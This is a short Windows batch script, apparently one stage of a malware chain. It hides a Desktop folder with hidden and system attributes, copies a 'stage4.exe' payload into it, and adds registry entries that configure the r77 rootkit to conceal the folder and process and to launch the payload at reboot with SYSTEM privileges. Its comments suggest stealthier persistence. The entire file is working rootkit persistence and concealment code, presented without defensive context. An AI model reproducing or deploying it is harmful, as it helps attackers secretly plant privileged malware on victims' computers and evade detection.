REM Creates a hidden folder in current user's path and makes it both hidden and system and copies the payload to it. 
mkdir %userprofile%\Desktop\hidden
attrib +H +S %userprofile%\Desktop\hidden
copy ./stage4.exe %userprofile%\Desktop\hidden
REM configures r77 rootkit to have the copied payload start up on reboot with SYSTEM privileges, there are even better ways to do this like persisting the entire payload in the registry
reg add HKEY_LOCAL_MACHINE\SOFTWARE\$77config\paths\ /v name /t REG_SZ /d "%userprofile%\Desktop\hidden"
reg add HKEY_LOCAL_MACHINE\SOFTWARE\$77config\process_names\ /v name /t REG_SZ /d stage4.exe
reg add HKEY_LOCAL_MACHINE\SOFTWARE\$77config\startup\ /v name /t REG_SZ /d "%userprofile%\Desktop\hidden\stage4.exe"



